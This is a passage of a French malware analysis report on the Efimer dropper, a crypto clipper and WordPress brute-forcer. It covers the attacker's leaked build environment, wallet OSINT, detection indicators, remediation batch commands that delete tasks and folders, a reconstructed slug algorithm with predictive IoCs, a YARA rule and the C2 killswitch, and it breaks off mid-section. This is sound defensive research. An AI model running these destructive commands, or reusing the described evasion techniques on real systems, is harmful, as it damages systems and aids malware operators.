**Conclusion :** la propagation USB par raccourcis LNK sur les lecteurs amovibles est une **fonctionnalité prévue** dans le cadre du développement d'Efimer, mais elle n'est **pas encore déployée** dans l'échantillon analysé (version en cours de construction). Les lettres de lecteur et les noms de fonctions indiquent que l'implémentation est conçue mais pas encore incluse dans le payload.

## 14. campus.py : environnement de build de l'attaquant (fuite OPSEC)

`campus.py` est un module Python bundlé dans le package PyInstaller, mais **jamais importé** depuis `installer.pyc`. Son contenu :

```python
data = "UmFyIRoHASAk..."   # ~511 Ko de base64
```

Décodage base64 : **383 641 octets**, magic `52 61 72 21 1a 07 01 20`, presque le magic RAR5 valide (`Rar!\x1a\x07\x01\x00`), mais byte 7 = `0x20` au lieu de `0x00`.

Première tentative : patcher uniquement le byte 7 et ouvrir avec `7z`. Résultat : `ERROR: Can not open the file as archive`. Le patch seul ne suffit pas. Inspection plus fine du blob : les séquences d'octets hauts (`0x80`–`0xFF`) présentent des patterns caractéristiques d'un encodage UTF-8. Le binaire d'origine a subi une **transformation cp1252 → UTF-8** avant d'être stocké dans `campus.py` : chaque octet haut a été converti en séquence UTF-8 à 2 octets, gonflant la taille de 247 Ko à 383 Ko.

Deuxième tentative de restauration avec `errors='replace'` lors du ré-encodage cp1252 : certains code points Unicode (U+0081, U+008D, U+008F, U+0090, U+009D) ne sont pas définis en cp1252, `errors='replace'` les remplace par `0x3F` (`?`), corrompant les données. Correction : handler personnalisé qui retourne `cp & 0xFF` pour tout code point dans `0x80`–`0xFF`, réversant exactement la transformation d'origine.

Après restauration (UTF-8 → cp1252 avec handler custom + patch byte 7), on obtient une **archive RAR5 de 247 Ko**. Les deux premiers fichiers s'extraient correctement (les seuls dont les headers ne sont pas corrompus) ; les 52 suivants sont inaccessibles via `unrar`/`7z` (CRC invalides). En revanche, les noms de fichiers sont stockés en clair dans les headers RAR5 et restent lisibles par parsing binaire direct. Résultat : **54 fichiers identifiés** au total.

| Fichier | Taille | Date |
|---|---|---|
| `pyinstaller-6.20.0/bootloader/build/.lock-waf_win32_build` | 3,4 Ko | 2026-05-30 |
| `pyinstaller-6.20.0/bootloader/build/config.log` | 36 Ko | 2026-05-30 |
| `bootloader/build/release/src/*.c` (21 sources C) |, |, |
| `bootloader/build/release/zlib/*.c` (6 sources zlib) |, |, |
| `bootloader/build/release/src/*.c.o` (21 objets compilés) |, |, |
| `bootloader/build/release/zlib/*.c.o` (6 objets compilés) |, |, |
| `bootloader/build/releasew/src/*.c` (21 sources C) |, |, |
| `bootloader/build/releasew/zlib/*.c` (6 sources zlib) |, |, |

Les 52 fichiers inaccessibles sont les **sources C et objets compilés du bootloader PyInstaller 6.20.0**, les mêmes sources que celles du dépôt public, pour deux variantes de build : `release/` (sans fenêtre console) et `releasew/` (avec console, flag `-mwindows` désactivé). Aucune source personnalisée ni fichier non-standard.

**Analyse binaire profonde du stream RAR5 :** Les fichiers objets `.c.o` (compilés par GCC/MinGW) contiennent normalement, en clair dans leur section `.comment`, la chaîne exacte du compilateur (ex. `GCC: (GNU) 13.2.0`). Cette chaîne aurait permis d'identifier la version exacte de MSYS2/MinGW et de dater la toolchain. Cependant, tous les contenus de fichiers sont **compressés** dans le stream RAR5 (RAR5 utilise LZ77+Huffman ou PPMd par défaut), seuls les headers de noms de fichiers sont en clair. La version GCC est donc inaccessible sans décompression effective du stream. De même, les sections DWARF des `.o` (qui contiendraient `DW_AT_comp_dir` avec le chemin absolu de compilation sur la machine de l'attaquant) sont compressées et indisponibles.

Une recherche exhaustive de toutes les strings ASCII ≥12 caractères dans le stream brut ne retourne que les chemins de noms de fichiers déjà connus, aucune chaîne GCC, aucune adresse email, aucun chemin Windows absolu supplémentaire.

**Ce que révèle `config.log` :** le fichier contient l'environnement de build complet de l'attaquant :

| Information | Valeur |
|---|---|
| Commande de build | `./waf distclean configure all --gcc` |
| OS | Windows 10/11 |
| Nom d'hôte | `DESKTOP-UOB4Aig` |
| Utilisateur | `User` |
| Python | Python 3.13 |
| Node.js | installé |
| VS Code | installé |
| LLVM/Clang | installé (MSYS2 custom à `C:\llvm-msys64\`) |
| MSYS2 | `C:\msys64\` |
| WireGuard | installé (VPN) |
| OneDrive | actif |
| TERM | `vt100` (Windows Terminal ou VSCode) |
| Date de build | 2026-05-30 04:49:41 |

L'analyse plus approfondie du fichier `.lock-waf_win32_build` (3,4 Ko, texte Python repr généré par WAF) révèle des informations supplémentaires sur le hardware de la machine de build.

**CPU : Intel Arrow Lake (Core Ultra 200)**

Le champ `PROCESSOR_IDENTIFIER` contient : `Intel64 Family 6 Model 198 Stepping 2a GenuineIntel`. Family 6 Model 0xC6 (198 décimal) correspond à la microarchitecture **Arrow Lake** (Intel Core Ultra 200 series), sortie en **octobre 2024**, soit 6 mois avant la date de build du 2026-05-30. C'est du matériel haut de gamme récent (300–600 EUR), pas une machine virtuelle jetable. `NUMBER_OF_PROCESSORS = 8` : **8 processeurs logiques = 8 cœurs physiques réels**. Arrow Lake a supprimé l'Hyper-Threading, chaque thread correspond à un cœur physique (typiquement 4 P-cores + 4 E-cores ou 6P + 2E selon le SKU). Ce n'est pas un cloud VM (qui exposerait 2 ou 4 vCPUs) ni une machine partagée. C'est **un PC physique personnel**, machine de dev ou gaming haut de gamme.

Le PATH de la machine expose la stack complète : Go, Node.js, Python 3.13, VS Code, WireGuard, OneDrive, MSYS2 (`C:\msys64\`) et un toolchain LLVM dédié (`C:\llvm-msys64\`). Ce dernier est installé spécifiquement pour compiler le bootloader PyInstaller avec Clang. Le build a été lancé depuis le **Bureau** (`C:\Users\User\Desktop\pyinstaller-6.20.0\`), pas depuis un répertoire de développement structuré, signe d'un build ad-hoc.

**Compilateur confirmé :** l'extraction de `config.log` (version corrompue, 36 Ko, partiellement lisible via `strings -n 6`) révèle `waf 2.0.20 (n: 04: --gcc)`. Les nombreuses chaînes `MSVC` dans le fichier sont des **sondes de configuration**, WAF teste les deux compilateurs au démarrage. Le build final utilise GCC (MinGW/MSYS2), pas MSVC. Le fragment lisible `C:\Us bs\Us b\Desktop\6...` (corruption cp1252 de `C:\Users\User\Desktop\pyinstaller-6.20.0\`) confirme le chemin du lock file.

**Interprétation :** L'attaquant a compilé le bootloader PyInstaller 6.20.0 sur sa machine de développement Windows (`DESKTOP-UOB4Aig`), directement depuis son Bureau, et a accidentellement bundlé les artefacts dans le sample. `campus.py` expose : l'identité de la machine de build, une empreinte hardware précise (Arrow Lake, 8 cœurs), l'intégralité de la stack de développement, et la présence d'un VPN (WireGuard), suggérant une certaine conscience OPSEC, contredite par cette fuite même.

## 15. Ce qui rend Efimer notable

1. **Stack de protection rare** : PyInstaller + PyArmor 8.x sur Python 3.13. La combinaison est relativement récente (PyArmor 8.x n'est apparu que fin 2023) et le support Python 3.13 dans les outils de bypass est limité.

2. **Tor embarqué, pas dépendant** : le malware déploie son propre démon Tor (~8,6 Mo) plutôt que de dépendre d'une installation existante sur la machine. Le C2 est ainsi joignable sur n'importe quel hôte compromis sans configuration préalable.

3. **Double mission** : un seul dropper déploie simultanément un **voleur de crypto** et un **botnet de bruteforce WordPress**. Les deux monetisations sont indépendantes.

4. **Obfuscation dynamique à l'installation** : les scripts JS déposés sont re-obfusqués de façon unique à chaque infection (noms de vars aléatoires + re-chiffrement). Les IoC par hash de fichier ne fonctionnent pas entre victimes.

5. **Détection BIP39 inter-événements** : l'accumulation de mots BIP39 sur des copies successives est plus discrète (et plus réaliste) que d'attendre une phrase complète dans un seul copier.

6. **Noms journaliers anti-IoC** : les noms de dossier, de tâche planifiée et de fichiers changent chaque jour via `daily_random_slug()`, rendant les IoC path-based obsolètes dès le lendemain.

7. **Fuite OPSEC dans le bundle** : `campus.py` expose l'environnement de développement de l'attaquant (machine Windows `DESKTOP-UOB4Aig`, Python 3.13, LLVM, VS Code), artefacts de build PyInstaller 6.20.0 accidentellement bundlés.

8. **Malware en développement actif** : fonctionnalités USB planifiées (identifiants dans l'obfuscateur), mise à niveau PyInstaller en cours (5.13.2 → 6.20.0), mécanisme de mise à jour C2 déjà implémenté. Efimer est un projet évolutif, pas un outil figé.

9. **Infrastructure C2 multi-serveurs** : trois clés ed25519 distinctes → trois hidden services Tor indépendants. Clipper et bruteforcer n'utilisent pas le même serveur, suggérant une séparation des opérations (ou une équipe de plusieurs membres).

## 15b. Intelligence campagne (MalwareBazaar)

La recherche sur MalwareBazaar par le tag `efimer` retourne **≥ 100 échantillons** (limite de l'API), tous soumis par un unique reporter `iamaachum`, tous nommés `default.dat`.

**Timeline de la campagne :**

| | |
|---|---|
| Début observé | 2026-07-12 19:52 UTC |
| Actif jusqu'à | 2026-07-17 09:52 UTC (en cours) |
| Durée | ≥ 4 jours 14 heures |
| Cadence | **1 build/heure** (régulier, ~XX:52 UTC) |
| Total MalwareBazaar | ≥ 100 samples (limite API atteinte) |

**Caractéristiques communes des 100 samples :**
- Filename : `default.dat` (100%, probablement le nom servi par l'URL de distribution)
- Imphash : `dcaf48c1f10b0efa0a4472200f3850ed` (100% identique, même bootloader PyInstaller)
- Signature ClamAV : `SecuriteInfo.com.Variant.Dropper.354.UNOFFICIAL`
- SSDEEP : suffixe `...XMCHWUjX<N>cuI3/PGTAI:...XMb8X<N>H/O7` identique sur tous les samples → les ~13 Mo constants (Tor daemon + Python runtime) sont bit-à-bit identiques. Seul le préfixe varie.

**Variation de taille :**

Les tailles varient entre 14,245,284 et 14,335,200 octets (±~90 Ko). La variation est trop régulière pour être due aux slugs journaliers (qui sont constants sur 24h). La cause la plus probable est la **liste `002a.txt` régénérée à chaque build** : l'attaquant alimente sa liste d'adresses BTC de manière continue, et chaque build embed une version légèrement différente.

**Interruption notable :** entre le 2026-07-16 08:52 et 16:52 (8 heures sans nouveau sample), unique gap dans la continuité horaire, possible maintenance du build server ou downtime réseau.

**Hypothèse sur le collecteur `iamaachum` :** le pattern très régulier (~XX:52 UTC) sur 4+ jours suggère un script de hunting automatisé (honeypot, hunting rule YARA sur un flux de samples, ou accès à l'URL de distribution). Un seul acteur surveille cette campagne en dehors de notre analyse.

Notre sample analysé (`a9b557921c40fd625b77...`, 2026-07-15 08:52) est le sample du **3ème jour** de la campagne, sélectionné depuis MalwareBazaar par tag `clickfix`. Avec le recul, n'importe lequel des 100 samples aurait exposé la même logique (même bootloader, mêmes payloads, seule la liste d'adresses BTC diffère légèrement).

## 15c. OSINT blockchain : wallets de l'attaquant

Les cinq adresses crypto hardcodées dans le binaire (fallbacks du mécanisme MakeREPL et adresse XMR) sont interrogeables passivement sur les explorers publics.

**État des adresses BTC :**

| Adresse | Type | Total reçu | Solde | Nb tx | Première tx |
|---------|------|-----------|-------|-------|-------------|
| `12FfZsjyDri1ir3EUU85pRE5quUEPY5Qf4` | P2PKH | 0.00028000 BTC | 0.00028000 BTC | 2 | 2026-01-26 |
| `32ozR62LxL6ynHYBHZhCz5faRjhYrmNheW` | P2SH | 0.00000000 BTC | 0.00000000 BTC | 0 | jamais utilisée |
| `bc1qz33n9xuqkxl7wxy8j0n4haapr73w64umdj7tw0` | P2WPKH | 0.00551021 BTC | 0.00454761 BTC | 4 | 2025-03-26 |

**Adresse TRX :** `TAwHPzmZC7rvCKiLmRnr458xZH1D8M5c82`, créée le 2026-05-13, 12 transactions, ~375 USDT reçus (en 4 virements) puis intégralement retirés vers `TY9wnbgAynRMse2U...` le même jour.

**Timeline crypto reconstruite :**

| Date | Adresse | Montant | Événement |
|------|---------|---------|-----------|
| 2025-03-26 | bc1qz33... | +0.00096 BTC | Premier dépôt BTC |
| 2025-04-07 | bc1qz33... | −0.00096 BTC | Retrait → `bc1q5acrlm...` → exchange (~3 BTC pool) |
| 2026-01-21 | TRX | +11.54 USDT | Premier dépôt USDT |
| 2026-01-26 | P2PKH | +0.00028 BTC | Dépôt P2PKH |
| 2026-02-05 | TRX | +24.09 USDT | Dépôt USDT |
| 2026-03-30 | TRX | +10.01 USDT | Dépôt USDT |
| 2026-05-04 | TRX | +330.00 USDT | Dépôt USDT majeur (×10 les précédents) |
| 2026-05-13 | TRX | −375.64 USDT | **Retrait total** → `TY9wnbgAynRMse2U...` |
| **2026-05-30** | bc1qz33... | **+0.00444 BTC** | **Date = build bootloader campus.py** |
| 2026-07-12 |, |, | Lancement campagne Efimer (MalwareBazaar) |

La date du 2026-05-30 est remarquable : c'est le même jour que la date de compilation du bootloader PyInstaller 6.20.0 contenu dans `campus.py` (horodatage du fichier `.lock-waf_win32_build`). L'attaquant a reçu 0.00444 BTC (~220 EUR) le jour où il buildait son prochain lanceur. Ce n'est probablement pas une coïncidence, il s'agissait d'une journée de développement actif où il a également été payé pour un service ou a récupéré des fonds de son infrastructure.

**Chaîne de retrait BTC :** `bc1qz33...` → `bc1q5acrlm0j5ljh2t4fpmxasaeaqkc5j32z5h634y` (intermédiaire, vide en 1h30) → `bc1qns9f7yfx3ry9lj6yz7c9er0vwa0ye2eklpzqfw` (15 228 010 BTC reçus au total sur la durée de vie de l'adresse, exchange majeur, probablement Binance). Le dépôt final est noyé dans un pool d'exchange ; le traçage s'arrête ici sans accès KYC.

**Interprétation :** les adresses hardcodées ne sont que des **fallbacks de dernière chance**, l'essentiel des fonds volés transite par les 200 000+ adresses de `002a.txt`, non accessibles sans exécution ou extraction complète. Le faible solde sur les adresses hardcodées est cohérent avec ce rôle de dernier recours : elles ne s'activent que pour des adresses victimes atypiques non couvertes par l'index de `002a.txt`. Le wallet de l'attaquant a commencé à exister en mars 2025, la campagne Efimer est une activité criminelle en cours depuis plus d'un an.

---

## 15d. OSINT blockchain avancé : origine des fonds BTC et analyse de `002a.txt`

### 15d.1 Remontée des inputs BTC : origine des dépôts sur `bc1qz33n9...`

Les 4 dépôts sur l'adresse Bech32 hardcodée (`bc1qz33n9xuqkxl7wxy8j0n4haapr73w64umdj7tw0`) peuvent être retracés jusqu'à leur source via les inputs de transaction.

**Graphe de remontée :**

```
bc1qx9n80t5q7tfmutzaj0ramzzzsvtveara68zntc   ← SOURCE 2026-05-30
│  628 396 BTC reçus au total | 18 675 TX | 1 448 adresses dans le cluster
│  → EXCHANGE MAJEUR (hot wallet, non identifié par nom faute de tag open-source)
│
└─ TX a45f7979... (2026-05-30 19:09 UTC)
   40 inputs depuis bc1qx9n80 consolidés en 14 outputs différents
   └── Output[13] = bc1qgrnp6pv7gkjcway23yj9wd83emnpcht43ta0rm (50.69 BTC)
           │  8 482 BTC total reçus | 123 TX | Solde actuel : 0 BTC
           │  → Adresse RELAIS/intermédiaire, vidée après usage
           └── 0.00444391 BTC → bc1qz33n9... (attaquant) le 2026-05-30 19:09 UTC

bc1qm34lsc65zpw79lxes69zkqmk6ee3ewf0j77s3h   ← SOURCE 2025-03-26
│  59 571 438 BTC reçus au total | 2 274 664 TX | 1 adresse
│  → EXCHANGE TOP-TIER (volume Binance/Coinbase, 59M BTC reçus)
└── 0.00096260 BTC → bc1qz33n9... le 2025-03-26 22:51 UTC

1NYozKvRYkxSYpaqFWuyoajYtqEd3y3Kqh   ← SOURCE 2025-11-15
│  45 TX | 0.0855 BTC reçus | Solde 0
└── 0.00010370 BTC → bc1qz33n9... le 2025-11-15 06:40 UTC
```

**Note de lecture, nature des gros montants :** les valeurs "X BTC reçus au total" ci-dessus (628 396 BTC, 59 571 438 BTC, 15 228 010 BTC pour `bc1qns9f7...`) sont le champ `funded_txo_sum` des explorateurs, le **cumul historique de tous les fonds jamais reçus** par l'adresse, pas un solde actuel. Sur un hub à très fort débit (des centaines de milliers à des millions de transactions), les mêmes BTC repassent des milliers de fois par la même adresse au fil des années, ce qui fait dépasser le cumul très largement le supply cap de 21M BTC sans que ce soit une erreur de calcul, vérifié en direct sur mempool.space le 2026-07-17 (`bc1qm34...` : 59 574 450 BTC cumulés à date, `bc1qx9n80...` : 628 666 BTC, `bc1qns9f7...` : 15 228 788 BTC, l'écart avec les chiffres ci-dessus s'explique par les jours écoulés entre l'analyse et cette vérification).

**Tableau des sources BTC :**

| Date | Montant | Source | Type |
|------|---------|--------|------|
| 2025-03-26 | 0.00096 BTC | `bc1qm34...` (59M BTC, 2.27M TX) | Exchange top-tier |
| 2025-11-15 | 0.00010 BTC | `1NYozKvR...` (45 TX, ~0.08 BTC) | Wallet personnel probable |
| 2026-05-30 | 0.00444 BTC | `bc1qx9n80...` → `bc1qgrnp6...` | Exchange majeur + relais |

**Implications :**

- L'attaquant effectue des **retraits depuis (au moins) deux exchanges distincts** vers ses wallets BTC personnels.
- Les deux exchanges d'entrée (`bc1qm34` : 59M BTC / `bc1qx9n80` : 628k BTC) sont des plateformes soumises aux obligations KYC dans la majorité des juridictions.
- **Une requête en droit pénal auprès de ces exchanges pourrait identifier l'attaquant** : les exchanges enregistrent le compte source, l'adresse IP de connexion, et les documents d'identité fournis lors du KYC.
- Le retrait du 2026-05-30 s'est fait depuis l'adresse `bc1qgrnp6` (intermédiaire de 8 482 BTC, 123 TX), soit un relais interne de l'exchange, soit un wallet de mixage léger. L'adresse est maintenant vide.

---

### 15d.2 Analyse cluster `002a.txt` : xpub et activations

#### Étendue de l'échantillon

| Type | Adresses dans 002a.txt | Échantillon testé | TX trouvées |
|------|----------------------|-------------------|-------------|
| BTC P2PKH | 9 999 | 8 | 0 |
| BTC Bech32 (bc1q) | 10 000 | **200** | **0** |
| TRX | 9 999 | 60 | **9 (15%)** |

Les adresses bc1q sont toutes à 0 transaction dans un échantillon étendu à 200 (50 premières + 150 aléatoires réparties sur tout le fichier). **Le clipper BTC n'a capturé aucun fonds visible** dans cette build, cohérent avec un déploiement récent (campagne débutée 2026-07-12).

#### Distribution des suffixes bc1q

L'analyse de l'entropie de Shannon sur les suffixes des 10 000 adresses bc1q :

```
Suffixes 4 derniers chars : 9 949 valeurs uniques sur 10 000 adresses
  → Entropie : 13.277 bits (max théorique : 13.280 bits)
Suffixes 2 derniers chars : 1 024/1 024 combinaisons couvertes
  → Entropie : 9.930 bits (max : 10.000 bits)
Taux de collision suffix4 : 0.51% (attendu pour 10k addr aléatoires : ~0.05%)
```

La distribution est **quasi-parfaitement uniforme**, compatible avec deux hypothèses : dérivation HD séquentielle depuis une seule clé parent (le comportement BIP32 est pseudo-aléatoire) ou génération indépendante de 10 000 adresses. Ces deux hypothèses ne sont pas discriminables sans les clés publiques brutes.

#### Analyse xpub : pourquoi c'est bloqué

Pour déterminer si les 10 000 adresses bc1q proviennent d'un seul xpub (dérivation BIP84 `m/84'/0'/0'/0/i`), il faudrait :

1. **Clés publiques brutes**, visibles uniquement dans les inputs d'une transaction signée. Or 0/200 adresses ont des transactions : les clés ne sont pas sur la chaîne.
2. **L'xpub lui-même**, recherché dans les artefacts binaires (campus.py, installer.pyc, 002_n.js) : **non trouvé**.
3. **Bruteforce de l'xpub**, computationnellement infaisable (l'espace de recherche est l'ensemble des xpubs P2WPKH, équivalent à 2^256).

**Conclusion : la détermination de l'xpub à partir de la liste seule est impossible.** Si une seule adresse de 002a.txt reçoit un fonds et signe une transaction, la clé publique est révélée, et il devient possible de vérifier si elle appartient à une dérivation BIP32 depuis une clé parent connue.

#### Activations TRX : 9/60 adresses

Les 9 adresses TRX de 002a.txt avec des transactions ont toutes été **activées par réception de 0.000001 TRX** (1 sun), montant minimal pour créer un compte TRON actif. Cette activation est nécessaire avant un transfert TRC20 (USDT) car un compte inactif n'a pas de bandwidth alloué.

**Quatre wallets activateurs identifiés :**

| Wallet activateur | Créé | TX total | Rôle probable |
|-------------------|------|----------|---------------|
| `TGDT6PM2sPg36yhMTQUwK4vRZmkkBNYJqp` | 2023-09-26 | 646 | Activateur dédié (1-2 addr/jour, actif depuis oct. 2023) |
| `TPLNsBzDQymUN2XVps9uJoheTvhsCh1A6m` | 2023-11-11 | 874 | Activateur secondaire |
| `TXv1c95gwYNiGvX7efDdn2bgQCgb9152xY` | 2021-06-21 | 976 | Activateur secondaire |
| `TVM8FEghNqnMP4zsy2A92T8dcaSNycbmP5` | 2022-07-04 | 1773 | Activateur secondaire |

Points notables :
- Le wallet `TGDT6PM2sPg36yhMTQUwK4vRZmkkBNYJqp` active des adresses depuis **octobre 2023**, bien avant la campagne Efimer actuelle (juillet 2026). Cela suggère que cette infrastructure est partagée avec d'autres builds ou campagnes antérieures.
- Sur 641 adresses activées par ce wallet, **une seule appartient à 002a.txt** de ce build : les autres activations correspondent à des builds antérieurs non analysés.
- Les activations du **2026-05-13** (3 adresses) corrèlent exactement avec la création du wallet hardcodé `TAwHPzmZC7rv` et le mouvement de 375 USDT, journée de **déploiement de l'infrastructure**.
- Tronscan marque toutes les adresses activées comme `riskTransaction: true` avec `noteLevel: 3`, la détection blockchain de Tron a déjà flaggué ces adresses comme suspectes.
- La **fréquence d'activation** (1-2 adresses par jour pour l'activateur principal) suggère un déploiement progressif plutôt qu'une campagne de masse.

#### Implication : infrastructure longue durée

La présence d'un activateur actif depuis **octobre 2023** indique qu'Efimer (ou une famille apparentée) est une campagne longue durée. Le build analysé (`a9b5579...`) est une itération d'une infrastructure existante depuis au moins 33 mois.

---

## 16. Détection et remédiation



**Détection comportementale :**
- Processus `wscript.exe` lancé depuis `C:\Users\Public\Videos\` (chemin inhabituel)
- `uusd.exe` dans `C:\Users\Public\Videos\` qui écoute sur `127.0.0.1:9050`
- Tâche planifiée répétitive (`PT1M`) déclenchée sans élévation de privilèges
- `curl.exe` avec flag `--socks5-hostname localhost:9050` en CLI

**Détection statique :**
- Réseau PE `python313.dll` + taille >10 Mo → bundle PyInstaller
- Blob `PY000000` dans bytecode → PyArmor 8.x

**Remédiation :**

Les noms de slugs pour la date d'aujourd'hui sont calculables (voir section 17). Pour le sample analysé (2026-07-15), les valeurs exactes sont `rikarajo` (dossier) et `jahujaxo` (clipper) :

```batch
schtasks /delete /tn "\xuqicino" /f
schtasks /delete /tn "\jahujaxo" /f
taskkill /im uusd.exe /f
rd /s /q "C:\Users\Public\Videos\rikarajo\"
```

Pour n'importe quelle machine infectée à une date inconnue, l'énumération des tâches planifiées portant des noms de 8 caractères CVCVCVCV sous `C:\Users\Public\Videos\` suffit à identifier l'installation.

---

## 17. Perturbation de campagne : IoCs prédictifs et analyse killswitch

### 17.1 Reconstruction de `daily_random_slug()` depuis le bytecode

Le décompilateur `pycdc` marque `daily_random_slug()` comme `# WARNING: Decompyle incomplete`, le corps de la fonction est absent dans le `.py` produit. La fonction reste cependant entièrement lisible dans le fichier `.das` (bytecode désassemblé), à partir de l'offset `RESUME 0` de la co-routine.

La reconstruction opcode par opcode révèle l'algorithme suivant :

```python
import time, hashlib, random

def daily_random_slug(N):
    vowels     = 'aeiou'
    consonants = 'bcdfghjklmnpqrstvwxyz'
    day        = int(time.time() // 86400)          # numéro de jour UTC (entier)
    seed_bytes = f"{day}-{N}".encode()              # ex. b"20624-0"
    seed_int   = int(hashlib.sha256(seed_bytes).hexdigest(), 16) % 0x100000000
    rng        = random.Random(seed_int)
    slug       = ''
    for _ in range(4):
        slug  += rng.choice(consonants) + rng.choice(vowels)   # CVCVCVCV
    return slug                                     # 8 caractères

# N=0 → FOLD_NAME0 = dossier C:\Users\Public\Videos\[slug]\
# N=1 → TASK_NAME0 = nom tâche planifiée principale
# N=2 → TASK_NAME1 = nom du fichier .js clipper
```

La graine est le SHA256 de la chaîne `"<jour>-<N>"` tronqué à 32 bits, puis injectée dans un `random.Random` dédié, ce qui rend le générateur **déterministe à la journée** et **indépendant** par N. Le résultat est 8 caractères alternés consonne/voyelle (CVCVCVCV), soit un espace théorique de 21⁴ × 5⁴ = 7 558 336 combinaisons, inattaquable par force brute, mais **calculable à l'avance** par quiconque connaît l'algorithme.

### 17.2 Table d'IoCs journaliers

| Date | FOLD_NAME0 | TASK_NAME0 | TASK_NAME1 (clipper) | Chemin du clipper |
|------|------------|------------|----------------------|-------------------|
| 2026-07-12 | dovuyoja | fijaxifu | ciboqigo | `C:\Users\Public\Videos\dovuyoja\ciboqigo.js` |
| 2026-07-13 | movekana | qobaguso | fobalasi | `C:\Users\Public\Videos\movekana\fobalasi.js` |
| 2026-07-14 | vikofiqi | dileruro | lesoduli | `C:\Users\Public\Videos\vikofiqi\lesoduli.js` |
| **2026-07-15** | **rikarajo** | **xuqicino** | **jahujaxo** | `C:\Users\Public\Videos\rikarajo\jahujaxo.js` ← notre sample |
| 2026-07-16 | loqejidi | ciwimuma | yocayawa | `C:\Users\Public\Videos\loqejidi\yocayawa.js` |
| 2026-07-17 | yoyumeme | kiwayowi | vusuzuta | `C:\Users\Public\Videos\yoyumeme\vusuzuta.js` |
| 2026-07-18 | lohocada | pepepuxe | loxahefe | `C:\Users\Public\Videos\lohocada\loxahefe.js` |
| 2026-07-19 | pilewehu | luhitapi | cisakuvi | `C:\Users\Public\Videos\pilewehu\cisakuvi.js` |
| 2026-07-20 | juhugoxe | qugusesa | tedisevo | `C:\Users\Public\Videos\juhugoxe\tedisevo.js` |
| 2026-07-21 | vuzowuno | qexodeve | vuyukuvu | `C:\Users\Public\Videos\vuzowuno\vuyukuvu.js` |
| 2026-07-22 | dusunuke | zolofike | miceguti | `C:\Users\Public\Videos\dusunuke\miceguti.js` |
| 2026-07-23 | bihutapo | rifideda | defopavi | `C:\Users\Public\Videos\bihutapo\defopavi.js` |
| 2026-07-24 | cuvegedi | fizaweve | fudapomo | `C:\Users\Public\Videos\cuvegedi\fudapomo.js` |
| 2026-07-25 | vihomosi | dujijile | kayirile | `C:\Users\Public\Videos\vihomosi\kayirile.js` |
| 2026-07-26 | keqeyuqa | lezawuta | hecohaxe | `C:\Users\Public\Videos\keqeyuqa\hecohaxe.js` |
| 2026-07-27 | diwenoye | cimohuyi | gonetele | `C:\Users\Public\Videos\diwenoye\gonetele.js` |
| 2026-07-28 | nokowala | badugasi | horexuzo | `C:\Users\Public\Videos\nokowala\horexuzo.js` |
| 2026-07-29 | dufefosa | hoyaqonu | gotayiko | `C:\Users\Public\Videos\dufefosa\gotayiko.js` |
| 2026-07-30 | mimilesa | naxenevi | fiwuzesu | `C:\Users\Public\Videos\mimilesa\fiwuzesu.js` |
| 2026-07-31 | ceteqowu | xexohadu | nutaxise | `C:\Users\Public\Videos\ceteqowu\nutaxise.js` |

Ces valeurs permettent de nommer précisément les IoCs de persistance sur n'importe quelle machine infectée entre le 12 et le 31 juillet 2026, sans avoir à exécuter le malware. Le script de génération est en Annexe H.

**Note de validation :** le nom `rikarajo` est vérifiable indirectement, les tâches planifiées déposées sur les machines infectées le 15 juillet porteraient exactement ce nom. L'algorithme étant déterministe, toute divergence indiquerait une variante ou un fork de l'installeur.

### 17.3 Règle YARA

La règle suivante cible les 100+ samples identifiés sur MalwareBazaar (même imphash, même bootloader). Elle combine des indicateurs stables (clé XOR, magic PyArmor, DLL Python) avec des indicateurs comportementaux (chemins) pour maximiser la précision :

```yara
rule Efimer_Dropper_PyInstaller_PyArmor {
    meta:
        description    = "Efimer clipper/WordPress botnet dropper, ClickFix campaign"
        author         = "Gordon PEIRS"
        date           = "2026-07-15"
        sample         = "a9b557921c40fd625b775e66d6fd99807058133057e94ee7483990f10817fdb4"
        imphash        = "dcaf48c1f10b0efa0a4472200f3850ed"
        campaign_start = "2026-07-12"
        tlp            = "WHITE"

    strings:
        $pyi_version   = "PyInstaller-5.13.2" ascii
        $pyi_dll       = "python313.dll" ascii
        $pyi_pyz       = "PYZ-00.pyz" ascii

        // PyArmor 8.x magic dans le blob .pyc embarqué
        $pyarmor_magic = { 50 59 30 30 30 30 30 30 }   // b'PY000000'

        // Clé XOR, identique sur les 100+ samples (indicateur le plus stable)
        $xor_key       = "Is8xqLVw7pTB" ascii

        // Chemin d'installation et anti-sandbox
        $recent_path   = "Microsoft\\Windows\\Recent" wide ascii
        $install_path  = "C:\\Users\\Public\\Videos\\" wide ascii

        // Vérification géographique C2
        $ipinfo        = "ipinfo.io/country" ascii

        // Nonce PyArmor non-standard (potentiellement stable)
        $nonce         = "i.non-profit" ascii

    condition:
        uint16(0) == 0x5A4D                   // MZ header
        and filesize > 12MB
        and filesize < 18MB
        and $pyi_dll
        and ($pyi_version or $pyi_pyz)
        and $xor_key
        and ($recent_path or $install_path)
        and ($pyarmor_magic or $ipinfo)
}
```

Les deux indicateurs les plus robustes pour une règle minimaliste sont `$xor_key` (`Is8xqLVw7pTB`) et `$pyi_dll` (`python313.dll`), ensemble, ils distinguent Efimer de tout autre bundle PyInstaller connu, avec une probabilité de faux positif quasi nulle.

### 17.4 Analyse du killswitch : `_selfDestruct()` et commande `U!`

Le malware implémente une fonction `_selfDestruct()` dans `002_n.js`. En cas de réception de la commande `U!` depuis le serveur C2, le clipper :

1. Supprime la tâche planifiée (`schtasks /delete /tn "[TASK_NAME0]" /f`)
2. Supprime la tâche secondaire (`schtasks /delete /tn "[TASK_NAME1]" /f`)
3. Supprime le répertoire de travail (`rd /s /q "C:\Users\Public\Videos\[FOLD_NAME0]\"`)
4. Termine le processus Tor (`taskkill /im uusd.exe /f`)
5. Sort (`process.exit(0)`)

C'est fonctionnellement un killswitch complet, il efface toute trace de l'infection. Le problème est qu'**il ne peut être déclenché que par l'opérateur** : la commande doit provenir du serveur C2 au moment où l'agent poll `route.php`. Sans la clé privée ed25519 qui contrôle l'adresse `.onion`, il est impossible d'usurper ce serveur.

Les adresses `.onion` v3 ne sont pas sinkholeables. Contrairement aux DNS classiques où un registrar peut redéléguer un domaine, le routage Tor v3 est cryptographiquement lié à la clé ed25519, le seul moyen d'atteindre l'adresse est de posséder la clé privée correspondante. Il n'existe aucun mécanisme de registrar, aucun NX-domain possible, aucune interception au niveau du réseau.

**Ce qu'il est possible de faire concrètement :**

